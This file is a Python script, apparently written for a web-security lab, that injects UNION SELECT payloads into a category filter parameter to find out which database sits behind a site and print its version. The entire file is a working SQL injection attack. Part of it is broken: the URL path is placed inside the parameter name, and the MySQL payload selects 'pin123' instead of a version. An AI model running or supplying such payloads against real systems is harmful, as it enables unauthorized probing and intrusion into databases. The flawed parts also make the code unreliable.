import requests
import re

def send_request(url, payload):
    params = {"/filter?category": payload}
    res = requests.get(url, params=params)
    return res.text

def run_union(url):
    print("\n[UNION SQL Injection 테스트 시작]\n")

    payloads = [
        "' UNION SELECT banner, NULL FROM v$version-- ",  # Oracle
        "' UNION SELECT @@version, NULL-- ",      # MSSQL
        "' UNION SELECT version(), NULL-- ",      # PostgreSQL

         "' UNION SELECT pin123, NULL#",        # MySQL
    ]

    for payload in payloads:
        print(f"\n[테스트 중 payload]: {payload}")

        res = send_request(url, payload)
        #url = f"{url}/filter?category=%27%20UNION%20SELECT%20@@version,%20NULL%23"
        #res = requests.get(url)

        oracle = re.findall(r"Oracle.*", res)
        postgres = re.findall(r"PostgreSQL.*", res)
        microsoft = re.findall(r"Microsoft.*", res)
        mysql = re.findall(r"\d+\.\d+\.\d+[-\w\.]*", res)

        if oracle:
            print("▶ Oracle DB 탐지")
            for o in oracle:
                print(o)
            return

        if postgres:
            print("▶ PostgreSQL DB 탐지")
            for p in postgres:
                print(p)
            return
        
        if mysql:
            print("▶ MySQL 가능성 높음")
            for m in mysql:
                print(m)
            return
        
        if microsoft:
            print("▶ Microsoft SQL Server 탐지")
            for m in microsoft:
                print(m)
            return
    

    print("\n❌ 버전 정보 탐지 실패")